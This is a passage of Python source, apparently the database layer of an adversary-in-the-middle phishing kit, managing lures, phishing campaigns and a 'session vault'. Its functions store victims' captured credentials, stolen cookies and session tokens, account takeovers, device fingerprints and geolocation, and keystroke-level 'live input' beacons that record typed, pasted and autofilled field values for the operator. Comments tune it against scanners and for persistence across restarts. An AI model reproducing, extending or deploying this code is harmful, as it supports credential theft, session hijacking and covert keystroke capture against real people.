             " created, last_used, opens, visitors, conversions, active, meta, notes"
             " FROM lures")
        if active_only:
            q += " WHERE active=1"
        q += " ORDER BY id DESC LIMIT ?"
        out = []
        for row in self._conn().execute(q, (limit,)).fetchall():
            out.append(Lure(id=row[0], token=row[1], phishlet=row[2], campaign=row[3],
                            label=row[4], kind=row[5], max_uses=row[6], uses=row[7],
                            created=row[8], last_used=row[9], opens=row[10],
                            visitors=json.loads(row[11] or "[]"), conversions=row[12],
                            active=bool(row[13]), meta=json.loads(row[14] or "{}"),
                            notes=row[15] or ""))
        return out

    # ---------------------------------------------------------- sessions ----
    def session_save(self, rec):
        """Upsert a session vault record (called on every state change).

        A session with nothing in it is not written: measured, 300 cookie-less page
        views produced 300 durable rows (the in-memory map is capped, the table is not),
        so any scanner burst bloated the operator's store with phantom sessions. A row
        appears as soon as the session actually has something - a credential, a cookie,
        an intel dump, a lure, a token set or a state past `opened`.
        """
        # annotate where the token lands: a verdict the operator has to ask for afterwards
        # arrives after the window closed
        if isinstance(rec, dict) and rec.get("tokens"):
            with contextlib.suppress(Exception):
                from core import tokenintel
                tokenintel.annotate(rec)
        if _challenge_only(rec):
            # an unauthenticated POST to the verify route mints a session each time
            # (300 posts -> 300 rows). Keep the refusals - they are the signal
            # the operator wants - but stop growing past the cap.
            if self._challenge_rows >= self._challenge_cap:
                return
            self._challenge_rows += 1
        with self._lock:
            # tokens_json and timeline_json are NOT written: they duplicated the content
            # already in record_json and no query ever read them (the read path -
            # session_get / session_list / sessions_since - all use record_json). Writing
            # them on every state change only doubled the row size.
            self._conn().execute(
                "INSERT INTO sessions (sid, ts, updated, phishlet, campaign, lure, ip,"
                " country, city, isp, ua, device_token, ja3, state, creds_json,"
                " cookies_json, takeovers_json, record_json)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"
                " ON CONFLICT(sid) DO UPDATE SET updated=excluded.updated,"
                " phishlet=excluded.phishlet, campaign=excluded.campaign,"
                " lure=excluded.lure, ip=excluded.ip, country=excluded.country,"
                " city=excluded.city, isp=excluded.isp, ua=excluded.ua,"
                " device_token=excluded.device_token, ja3=excluded.ja3,"
                " state=excluded.state, creds_json=excluded.creds_json,"
                " cookies_json=excluded.cookies_json,"
                " takeovers_json=excluded.takeovers_json, record_json=excluded.record_json",
                (rec.get("sid"), rec.get("created") or time.time(),
                 rec.get("updated") or time.time(), rec.get("phishlet", ""),
                 rec.get("campaign", ""), rec.get("lure", ""), rec.get("ip", ""),
                 (rec.get("geo") or {}).get("country", ""), (rec.get("geo") or {}).get("city", ""),
                 (rec.get("geo") or {}).get("isp", ""), rec.get("ua", ""),
                 rec.get("device_token", ""), json.dumps(rec.get("ja3") or {}),
                 rec.get("state", "opened"),
                 json.dumps(rec.get("credentials") or {}, default=str),
                 json.dumps(rec.get("cookies") or [], default=str),
                 json.dumps(rec.get("takeovers") or [], default=str),
                 json.dumps(rec, default=str)))
            self._conn().commit()
        return rec.get("sid")

    def sessions_since(self, since_ts, limit=500, campaign=None):
        """Vault records updated after `since_ts`, newest first.

        This is what a restart restores from: the live objects are gone, the rows are
        not.
        """
        q = ("SELECT record_json FROM sessions WHERE updated >= ?"
             + (" AND campaign = ?" if campaign else "")
             + " ORDER BY updated DESC LIMIT ?")
        args = [float(since_ts)]
        if campaign:
            args.append(str(campaign))
        args.append(int(limit))
        out = []
        with self._lock:
            for (blob,) in self._conn().execute(q, tuple(args)):
                with contextlib.suppress(Exception):
                    rec = json.loads(blob or "{}")
                    if isinstance(rec, dict) and rec.get("sid"):
                        out.append(rec)
        return out

    def session_get(self, sid):
        row = self._conn().execute(
            "SELECT record_json FROM sessions WHERE sid=?", (str(sid or ""),)).fetchone()
        if not row:
            return None
        try:
            return json.loads(row[0] or "{}")
        except Exception:
            return None

    def session_list(self, limit=200, state=None):
        q = ("SELECT sid, updated, phishlet, campaign, lure, ip, country, ua,"
             " device_token, state, creds_json, cookies_json, takeovers_json"
             " FROM sessions")
        args = []
        if state:
            q += " WHERE state=?"
            args.append(state)
        q += " ORDER BY updated DESC LIMIT ?"
        args.append(limit)
        out = []
        for r in self._conn().execute(q, tuple(args)).fetchall():
            try:
                creds = json.loads(r[10] or "{}")
            except Exception:
                creds = {}
            try:
                cookies = json.loads(r[11] or "[]")
            except Exception:
                cookies = []
            try:
                tk = json.loads(r[12] or "[]")
            except Exception:
                tk = []
            out.append({"sid": r[0], "updated": r[1], "phishlet": r[2],
                        "campaign": r[3], "lure": r[4], "ip": r[5], "country": r[6],
                        "ua": r[7], "device_token": r[8], "state": r[9],
                        "creds": len([v for v in creds.values() if v]),
                        "cookies": len(cookies), "takeovers": len(tk),
                        "identity": identity_of(creds)})
        return out

    def device_hit_count(self, device_token):
        """Activity already recorded for this device token.

        Counts the intel rows that carry the token (one per device dump) plus the session
        rows referencing it, so a device that was already over the limit is not served
        again just because the process restarted. `captures` has no sid column, so it
        cannot be joined here.
        """
        if not device_token:
            return 0
        total = 0
        for sql, args in (("SELECT COUNT(*) FROM intel WHERE device_token=?", (device_token,)),
                          ("SELECT COUNT(*) FROM sessions WHERE device_token=?",
                           (device_token,))):
            with contextlib.suppress(Exception):
                total += int(self._conn().execute(sql, args).fetchone()[0] or 0)
        return total

    def session_stats(self, campaign=None):
        """Session counts, optionally scoped to one campaign.

        Unscoped counts every session in the database; a campaign-scoped view
        next to a campaign-scoped capture count must not mix the two.
        """
        where = " WHERE campaign=?" if campaign else ""
        args = (campaign,) if campaign else ()
        one = self._conn().execute(
            "SELECT COUNT(*), SUM(CASE WHEN state IN ('session','takeover','done')"
            " THEN 1 ELSE 0 END), SUM(CASE WHEN state='creds' THEN 1 ELSE 0 END)"
            f" FROM sessions{where}", args).fetchone()
        return {"sessions": one[0] or 0, "sessions_captured": one[1] or 0,
                "sessions_creds_only": one[2] or 0, "campaign": campaign or ""}


    def intel_stats(self):
        one = self._conn().execute(
            "SELECT COUNT(*), COUNT(DISTINCT sid), COUNT(DISTINCT device_token),"
            " SUM(CASE WHEN headless >= 40 THEN 1 ELSE 0 END),"
            " SUM(CASE WHEN vpn >= 30 THEN 1 ELSE 0 END) FROM intel").fetchone()
        return {"intel_records": one[0] or 0, "unique_sessions": one[1] or 0,
                "unique_devices": one[2] or 0, "likely_bots": one[3] or 0,
                "vpn_suspected": one[4] or 0}


    # ------------------------------------------------------- live input ----
    def live_add(self, sid, kind, events, ts=None):
        """Store one real-time input beacon (bounded by the caller)."""
        import json as _json
        ts = float(ts or time.time())
        first_field = next((e.get("n") for e in events if e.get("n")), "")
        vals = "; ".join(f"{e.get('n')}={e.get('v')}" for e in events
                         if e.get("k") in ("input", "autofill", "paste") and e.get("v"))
        with self._lock:
            self._conn().execute(
                "INSERT INTO live_input (sid, ts, kind, field, value, events_json)"
                " VALUES (?,?,?,?,?,?)",
                (sid, ts, str(kind or "input"), str(first_field or "")[:60],
                 vals[:2000], _json.dumps(events, ensure_ascii=False)[:20000]))
            # a beacon per keystroke burst: keep the newest rows per session so a
            # long visit cannot grow the store without bound
            self._conn().execute(
                "DELETE FROM live_input WHERE sid=? AND id NOT IN"
                " (SELECT id FROM live_input WHERE sid=? ORDER BY id DESC LIMIT ?)",
                (sid, sid, int(LIVE_ROWS_PER_SESSION)))
            self._conn().commit()

    def prune_live(self, keep_days=None, keep_rows=None):
        """Drop live-input rows: older than keep_days and/or beyond keep_rows.

        Every keystroke beacon is a row, so a long campaign accumulates them
        without limit. Returns the number removed.
        """
        removed = 0
        if keep_days:
            cutoff = time.time() - float(keep_days) * 86400
            cur = self._conn().execute("DELETE FROM live_input WHERE ts < ?", (cutoff,))
            removed += max(0, cur.rowcount or 0)
        if keep_rows:
            cur = self._conn().execute(
                "DELETE FROM live_input WHERE id NOT IN"
                " (SELECT id FROM live_input ORDER BY id DESC LIMIT ?)", (int(keep_rows),))
            removed += max(0, cur.rowcount or 0)
        self._conn().commit()
        return removed

    def live_purge(self, sid):
        """Drop one session's live stream (the vault record stays)."""
        cur = self._conn().execute("DELETE FROM live_input WHERE sid=?", (sid,))
        self._conn().commit()
        return max(0, cur.rowcount or 0)

    def live_count(self, sid=None):
        if sid:
            row = self._conn().execute("SELECT COUNT(*) FROM live_input WHERE sid=?",
                                       (sid,)).fetchone()
        else:
            row = self._conn().execute("SELECT COUNT(*) FROM live_input").fetchone()
        return int(row[0] or 0)

    def live_for(self, sid, limit=200):
        """Newest-last slice of a session's live stream."""
        import json as _json
        with self._lock:
            rows = self._conn().execute(
                "SELECT ts, kind, events_json FROM live_input"
                " WHERE sid=? ORDER BY id DESC LIMIT ?", (sid, int(limit))).fetchall()
        out = []
        for ts, kind, blob in reversed(rows):
            try:
                events = _json.loads(blob or "[]")
            except Exception:
                events = []
            out.append({"ts": ts, "kind": kind, "events": events})
        return out
